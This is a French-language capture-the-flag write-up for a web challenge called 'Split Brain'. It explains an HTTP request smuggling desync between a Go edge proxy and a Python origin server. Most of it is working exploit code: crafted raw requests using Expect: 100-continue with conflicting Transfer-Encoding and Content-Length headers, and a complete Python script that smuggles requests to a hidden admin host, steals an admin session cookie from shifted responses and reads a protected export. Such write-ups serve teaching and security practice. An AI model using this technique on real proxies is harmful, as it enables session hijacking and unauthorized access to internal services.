# Split Brain — Writeup

## Énoncé (HTL)

- **Titre :** Split Brain
- **Catégorie :** webex
- **Points :** 335
- **Solves :** 87
- **Connexion :** `http://web.ctf.yogosha.com:8001`

> StreamFront is a bespoke HTTP/1.1 reverse proxy sitting in front of a single
> origin. Anyone can read the public marketing site. The operations console lives
> on a separate virtual host, `admin.internal`, which the edge flatly refuses to
> route from the public port, and an internal keep-alive agent logs into that
> console on a tight loop. The flag is in an export endpoint on that console, and
> all you hold is the public edge. Make the edge and the origin disagree about
> where your request ends, and take what the console agent is carrying.
>
> The edge gives each client its own isolated worker, and a console keep-alive
> agent runs on that worker: send a unique `X-StreamFront-Session: <id>` header
> (pick any stable random value) on every request so all of your traffic shares
> one upstream with your own session's agent.

## Protections / modèle

- Deux composants : un **edge** en Go (`proxy/main.go`) devant un **origin** en
  Python (`backend/backend.py`), reliés par une connexion **keep-alive** réutilisée.
- Le edge **refuse** de router l'hôte `admin.internal` (`403`).
- Si on envoie `X-StreamFront-Session: <id>`, le edge nous attribue un *worker*
  isolé **avec un agent keep-alive** qui, en boucle, fait `POST /admin/login` sur
  `admin.internal` (bons identifiants) et reçoit un `Set-Cookie: adminsession=<TOKEN>`.
- Le flag est sur `GET /internal/admin/export` (vhost `admin.internal`), accessible
  seulement avec ce cookie `adminsession`.

On partage donc **la même connexion upstream** que l'agent admin. Objectif :
désynchroniser le edge et l'origin pour voler le cookie de l'agent, puis lire
l'export.

## Vulnérabilité : désync HTTP (le edge lit le corps, l'origin l'ignore)

Les deux parsers ne décident pas pareil de la **fin du corps** quand il y a à la
fois `Transfer-Encoding` (≠ `chunked`) et `Content-Length` :

**Edge** (`main.go`, `readBody`) — avec `Expect: 100-continue`, il **saute** le
rejet « TE et CL présents en même temps », puis comme TE n'est pas `chunked`, il
lit le corps **par Content-Length** :

```go
if req.expect != "100-continue" {
    if req.malformed { return nil, errBadRequest }
    if te != "" && cl != "" { return nil, errBadRequest }   // sauté si Expect!
}
if te == "chunked" { return copyChunked(r, raw) }
if cl != "" { /* lit N octets ... */ }                      // <-- edge: CL
```

**Origin** (`backend.py`, `read_body`) — dès qu'un `Transfer-Encoding` est présent
mais ≠ `chunked`, il renvoie un **corps vide** et **ne consomme pas** les octets :

```python
if te is not None:
    if te.lower() == "chunked":
        return read_chunked(stream)
    return b""          # <-- origin: n'avale PAS les N octets du corps
```

Conséquence : les `N` octets que le edge transmet comme « corps » ne sont pas lus
par l'origin ; ils restent dans son tampon et sont interprétés comme **la requête
suivante** sur la connexion partagée. On peut donc **smuggler** une requête
arbitraire — y compris avec `Host: admin.internal` (le edge ne l'inspecte pas, ce
n'est que du corps pour lui).

Chaque requête smugglée produit une réponse **non lue** : la file des réponses de
l'upstream est **décalée de 1**. Du coup nos requêtes normales suivantes reçoivent
la réponse *de la requête précédente* — souvent celle de l'agent admin
(`POST /admin/login` → `Set-Cookie: adminsession=<TOKEN>`).

> Remarque : côté edge, `handle()` lit **une seule** requête par connexion TCP puis
> ferme. Pour enchaîner plusieurs requêtes sur le même worker, on ouvre plusieurs
> connexions TCP en réutilisant le **même** `X-StreamFront-Session`.

## Résolution pas à pas

1. Une requête = une connexion TCP, toutes avec le même id de session :

```python
import socket, secrets
SESSION = "sess-" + secrets.token_hex(8)
def send_one(raw):
    s = socket.create_connection((HOST, PORT), timeout=5); s.settimeout(3)
    s.sendall(raw)
    buf = b""
    try:
        while True:
            c = s.recv(65536)
            if not c: break
            buf += c
    except socket.timeout: pass
    s.close(); return buf
```

2. La requête de désync : `Expect: 100-continue` + `Transfer-Encoding: cow` +
   `Content-Length = len(corps)`. Le « corps » est la requête smugglée :

```python
def outer(smuggled):
    return (f"POST / HTTP/1.1\r\nHost: front.local\r\n"
            f"X-StreamFront-Session: {SESSION}\r\n"
            f"Transfer-Encoding: cow\r\n"
            f"Content-Length: {len(smuggled)}\r\n"
            f"Expect: 100-continue\r\nConnection: keep-alive\r\n\r\n").encode() + smuggled
```

3. Requête smugglée inoffensive pour **créer le décalage** de file :

```python
inoffensif = b"GET / HTTP/1.1\r\nHost: front.local\r\nConnection: keep-alive\r\n\r\n"
send_one(outer(inoffensif))
```

4. On envoie des `GET /` normaux et on **guette `adminsession=`** dans les réponses
   (ce sont les réponses décalées de l'agent admin) :

```python
import re
for _ in range(60):
    r = send_one(b"GET / HTTP/1.1\r\nHost: front.local\r\n"
                 b"X-StreamFront-Session: " + SESSION.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
    m = re.search(rb"adminsession=([0-9a-f]+)", r)
    if m: token = m.group(1).decode(); break
```

5. On smuggle la requête d'export avec le cookie volé, puis on lit la réponse
   (qui contient `flag=HTL{...}`) :

```python
exp = (f"GET /internal/admin/export HTTP/1.1\r\nHost: admin.internal\r\n"
       f"Cookie: adminsession={token}\r\nConnection: keep-alive\r\n\r\n").encode()
send_one(outer(exp))
# puis quelques GET / normaux jusqu'à voir "flag=" dans une réponse
```

## Script complet -> Script intégral

```python
#!/usr/bin/env python3
# Split Brain / StreamFront — désync HTTP, sockets purs (pas de pwntools).
# Usage: python3 solve.py <host> <port>
#        python3 solve.py web.ctf.yogosha.com 8001
import socket, sys, time, re, secrets

HOST = sys.argv[1] if len(sys.argv) > 1 else "web.ctf.yogosha.com"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8001
SESSION = "sess-" + secrets.token_hex(8)       # notre worker + notre agent admin
PUBLIC_HOST, ADMIN_HOST = "front.local", "admin.internal"

def send_one(raw: bytes, read_timeout=3.0) -> bytes:
    """Une requête == une connexion TCP (le edge traite 1 req puis ferme)."""
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.settimeout(read_timeout)
    s.sendall(raw)
    buf = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    finally:
        s.close()
    return buf

def outer_with_smuggled(smuggled: bytes) -> bytes:
    """Désync : le edge cadre le corps via Content-Length (TE != 'chunked'),
    l'origin voit un Transfer-Encoding, renvoie un corps vide et NE consomme PAS
    ces octets -> ils deviennent la requête suivante en amont.
    Expect: 100-continue fait sauter au edge son rejet 'TE et CL présents'."""
    return (f"POST / HTTP/1.1\r\n"
            f"Host: {PUBLIC_HOST}\r\n"
            f"X-StreamFront-Session: {SESSION}\r\n"
            f"Transfer-Encoding: cow\r\n"
            f"Content-Length: {len(smuggled)}\r\n"
            f"Expect: 100-continue\r\n"
            f"Connection: keep-alive\r\n\r\n").encode() + smuggled

def normal() -> bytes:
    return (f"GET / HTTP/1.1\r\n"
            f"Host: {PUBLIC_HOST}\r\n"
            f"X-StreamFront-Session: {SESSION}\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()

def smuggled_req(path, host, cookie=None) -> bytes:
    h = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
    if cookie:
        h += f"Cookie: {cookie}\r\n"
    h += "Connection: keep-alive\r\n\r\n"
    return h.encode()

print(f"[*] session = {SESSION}")

# Phase 0 : créer la session (démarre son agent admin) et planter un 1er smuggle
# inoffensif -> décale de 1 la file des réponses de l'upstream.
send_one(outer_with_smuggled(smuggled_req("/", PUBLIC_HOST)))
time.sleep(0.5)

# Phase 1 : grâce au décalage, nos requêtes normales lisent les réponses destinées
# à l'agent admin -> on capture son Set-Cookie: adminsession=...
token = None
cookie_re = re.compile(rb"adminsession=([0-9a-f]+)", re.I)
for i in range(60):
    resp = send_one(normal())
    m = cookie_re.search(resp)
    if m:
        token = m.group(1).decode()
        print(f"[+] cookie admin volé après {i + 1} sondes : adminsession={token}")
        break
    if i % 10 == 9:                       # replanter le décalage s'il se vide
        send_one(outer_with_smuggled(smuggled_req("/", PUBLIC_HOST)))
    time.sleep(0.05)

if not token:
    print("[-] échec capture du cookie admin"); sys.exit(1)

# Phase 2 : smuggler l'export console avec le cookie volé, puis sonder jusqu'à voir
# la réponse (flag=HTL{...}).
exp = smuggled_req("/internal/admin/export", ADMIN_HOST, cookie=f"adminsession={token}")
for i in range(40):
    send_one(outer_with_smuggled(exp))
    for _ in range(4):
        resp = send_one(normal())
        if b"flag=" in resp:
            fm = re.search(rb"flag=(\S+)", resp)
            print("[+] Flag :", fm.group(1).decode()); sys.exit(0)
    time.sleep(0.05)

print("[-] réponse d'export non observée"); sys.exit(1)
```

## Flag

```
HTL{desync_splits_the_brain}
```

*(Testé en local en montant les deux conteneurs fournis — edge Go + origin Python,
dont les identifiants admin par défaut coïncident — flag de dev
`HTL{dev_default_splitbrain}` ; puis sur l'instance HTL qui renvoie le flag ci-dessus.
Le cookie admin a été capturé dès la première sonde.)*
